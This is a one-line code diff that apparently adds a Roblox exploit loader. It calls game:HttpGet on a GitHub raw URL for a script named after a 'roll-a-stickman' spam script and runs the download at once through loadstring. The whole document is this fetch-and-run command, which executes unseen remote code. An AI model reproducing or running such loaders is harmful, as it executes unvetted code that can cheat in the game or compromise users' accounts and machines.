@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Entitybybreed/loaders/main/loaders/update-roll-a-stickman-spam3-wapbkvsagqpry5.lua"))()
